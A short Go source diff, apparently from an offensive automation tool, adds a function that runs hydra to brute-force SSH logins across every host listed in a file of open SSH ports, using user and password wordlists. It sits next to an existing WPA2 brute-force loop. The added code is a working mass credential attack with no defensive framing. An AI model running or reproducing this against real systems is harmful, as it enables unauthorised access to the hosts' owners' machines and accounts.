@@ -143,3 +143,12 @@ func runWPA2BruteForceInLoop() {
 	}
 	fmt.Println("finishing brute force")
 }
+
+func runHydraBruteForceToFiles() {
+	fmt.Println("running brute force to all ips who has ssh open...")
+	stdout, stderr := execCmd(fmt.Sprintf("hydra -L users.txt -P %v -M open-ssh-ports.txt -t 4 ssh", SSH_WORDLIST))
+	fmt.Println("HYDRA stdout>")
+	fmt.Println(stdout)
+	fmt.Println("HYDRA stderr>")
+	fmt.Println(stderr)
+}
